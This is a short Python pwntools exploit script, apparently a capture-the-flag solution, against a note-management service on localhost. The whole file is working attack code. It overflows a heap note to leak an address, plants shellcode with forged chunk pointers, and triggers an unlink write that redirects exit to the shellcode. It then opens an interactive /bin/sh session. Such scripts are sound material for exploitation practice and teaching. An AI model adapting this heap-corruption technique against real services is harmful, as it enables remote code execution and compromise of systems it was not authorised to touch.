#!/usr/bin/env python

from pwn import *


def wait_menu(option):
    p.recvuntil('Please choose an option.\n')
    p.sendline(str(option))


def add_note(size):
    wait_menu(1)
    p.recvuntil('Please give me a size.\n')
    p.sendline(str(size))


def remove_note(id):
    wait_menu(2)
    p.recvuntil('Please give me an id.\n')
    p.sendline(str(id))


def change_note(id, size, content):
    wait_menu(3)
    p.recvuntil('Please give me an id.\n')
    p.sendline(str(id))
    p.recvuntil('Please give me a size.\n')
    p.sendline(str(size))
    p.recvuntil('Please input your data.\n')
    p.send(content)


def print_note(id):
    wait_menu(4)
    p.recvuntil('Please give me an id.\n')
    p.sendline(str(id))


p = remote('localhost', 8048)

shellcode = '\xeb\x06' + 'A'*6 + asm(shellcraft.sh())

add_note(36)  # 0
add_note(12)  # 1
change_note(0, 52, 'A'*52)

EXIT = 0x804A008

print_note(0)
addr = u32(p.recvline()[56:60]) + 12
log.info('addr: 0x%x' % addr)

change_note(0, 60, shellcode + 'A'*(52 - len(shellcode)) + p32(EXIT - 8) + p32(addr))
remove_note(1)

p.interactive()
